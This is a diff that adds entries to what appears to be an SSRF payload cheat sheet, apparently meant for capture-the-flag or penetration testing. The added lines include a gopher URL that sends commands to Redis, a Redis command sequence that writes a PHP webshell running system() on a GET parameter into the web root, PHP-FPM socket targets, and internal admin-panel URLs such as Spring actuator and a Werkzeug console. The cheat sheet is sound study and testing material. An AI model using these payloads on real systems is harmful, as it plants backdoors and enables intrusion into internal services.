@@ -105,6 +105,41 @@ dict://127.0.0.1:6379/info
 php://filter/convert.base64-encode/resource=/flag.txt
 ```
 
+## Redis via gopher
+
+```text
+gopher://127.0.0.1:6379/_%2a1%0d%0a%244%0d%0aINFO%0d%0a
+```
+
+Write webshell when Redis can write into webroot:
+
+```text
+CONFIG SET dir /var/www/html
+CONFIG SET dbfilename shell.php
+SET x "<?php system($_GET[0]); ?>"
+SAVE
+```
+
+## PHP-FPM / FastCGI
+
+```text
+127.0.0.1:9000
+/var/run/php/php-fpm.sock
+/run/php/php-fpm.sock
+```
+
+Use `gopherus` or `fastcgi_param SCRIPT_FILENAME /var/www/html/index.php` payloads.
+
+## Admin Panels
+
+```text
+http://127.0.0.1:9200/_cat/indices
+http://127.0.0.1:8983/solr/admin/cores
+http://127.0.0.1:15672/
+http://127.0.0.1:8080/actuator/env
+http://127.0.0.1:5000/console
+```
+
 ## Docker / Compose
 
 ```text
